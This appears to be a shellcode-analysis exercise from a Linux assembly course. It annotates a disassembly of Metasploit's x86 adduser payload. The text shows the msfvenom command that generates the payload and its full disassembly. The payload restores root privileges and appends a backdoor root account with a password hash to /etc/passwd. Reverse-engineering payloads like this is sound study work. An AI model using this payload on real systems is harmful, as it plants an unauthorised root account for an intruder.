paul@SLAE001:~$ msfvenom  -p linux/x86/adduser -o linux-x86-adduser.bin -f raw
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 97 bytes
Saved as: linux-x86-adduser.bin
paul@SLAE001:~$ ndisasm -p intel linux-x86-adduser.bin 


00000000  31C9              xor cx,cx		<-- clear cx
00000002  89CB              mov bx,cx		<-- clear bx
00000004  6A46              push byte +0x46	<-- push 0x46 (decimal 70) onto the stack
00000006  58                pop ax		<-- pop the 70 into ax
00000007  CD80              int 0x80		<-- invoke system call 70, setreuid(0, 0)


00000009  6A05              push byte +0x5	<-- push 5 onto the stack	
0000000B  58                pop ax		<-- pop the 5 into ax
0000000C  31C9              xor cx,cx		<-- unnecessarily clear cx...
0000000E  51                push cx		<-- push null onto the stack
0000000F  687373            push word 0x7373	<-- push sswd
00000012  7764              ja 0x78		<-- ndisasm gets it wrong here, the 0x68 opcode is used for either push word or dword
00000014  682F2F            push word 0x2f2f	<-- push //pa
00000017  7061              jo 0x7a		<-- another opcode 0x68 misinterpretation
00000019  682F65            push word 0x652f	<-- push /etc
0000001C  7463              jz 0x81		<-- another opcode 0x68 misinterpretation
0000001E  89E3              mov bx,sp		<-- point bx to the top of the stack, to the string /etc//passwd
00000020  41                inc cx		<-- increment cx to 1
00000021  B504              mov ch,0x4		<-- move 4 into ch, making cx 0x41, equivalent to O_WRONLY|O_APPEND flag to open()
00000023  CD80              int 0x80		<-- invoke system call 5, open('/etc//passwd', O_WRONLY|O_APPEND) 


00000025  93                xchg ax,bx		<-- switch ax and bx, so ax=pointer to '/etc//passwd', bx=the fd for the open file
			;inserted \xcc\xcc here to allow inspection with gdb during analysis...
00000026  E82800            call word 0x51	<-- call 0x51, jumps to 0x53 according to gdb 



The folowing looks like an ASCII data section, a string of '\0\0metasploit:Az/dIsj4p4IRc:0:0::/:/bin/sh'

00000029  0000              add [bx+si],al	<-- null padding
0000002B  6D                insw		<--------------  String between 0x2d and 0x52 
0000002C  657461            gs jz 0x90
0000002F  7370              jnc 0xa1
00000031  6C                insb
00000032  6F                outsw
00000033  69743A417A        imul si,[si+0x3a],word 0x7a41
00000038  2F                das
00000039  6449              fs dec cx
0000003B  736A              jnc 0xa7
0000003D  3470              xor al,0x70
0000003F  3449              xor al,0x49
00000041  52                push dx
00000042  633A              arpl [bp+si],di
00000044  303A              xor [bp+si],bh
00000046  303A              xor [bp+si],bh
00000048  3A2F              cmp ch,[bx]
0000004A  3A2F              cmp ch,[bx]
0000004C  62696E            bound bp,[bx+di+0x6e]
0000004F  2F                das
00000050  7368              jnc 0xba
00000052  0A					<--------------  String between 0x2d and 0x52 

...At this point, as I've cut into what ndisasm thought was an instruction, I'll restart the disassembly to make the output cleaner and avoid having to try and re assemble the opcodes...

paul@SLAE001:~$ ndisasm -k 0,83 linux-x86-adduser.bin 
00000000  skipping 0x53 bytes
00000053  59                pop cx		<-- pop return address into cx (points to start of string at 0x2d)
00000054  8B51FC            mov dx,[bx+di-0x4]  <-- gdb says: edx,DWORD PTR [ecx-0x4], ecx-4 is loc 0x27 which contains 0x28
00000057  6A04              push byte +0x4	<-- push 4
00000059  58                pop ax		<-- pop 4 into ax
0000005A  CD80              int 0x80		<-- invoke system call 4, write(fd, string, 0x28) - 0x28 is buffer length

0000005C  6A01              push byte +0x1	<-- push 1
0000005E  58                pop ax		<-- pop 1 into ax
0000005F  CD80              int 0x80		<-- invoke system call 1, exit()



So, in summary;

invoke system call 70, setreuid(0, 0)	- Get back any dropped privs
invoke system call 5, open('/etc//passwd', O_WRONLY|O_APPEND) 	- open /etc/passwd for writing
jump over the string to be written
invoke system call 4, write(fd, string, 0x28) 	- write a new entry for a new user
invoke system call 1, exit()	- exit gracefully

There's certainly some room for size optimisation here, does the graceful exit need to be there, for example?  
Also, need to consider that most modern systems use /etc/shadow for the password hashes.




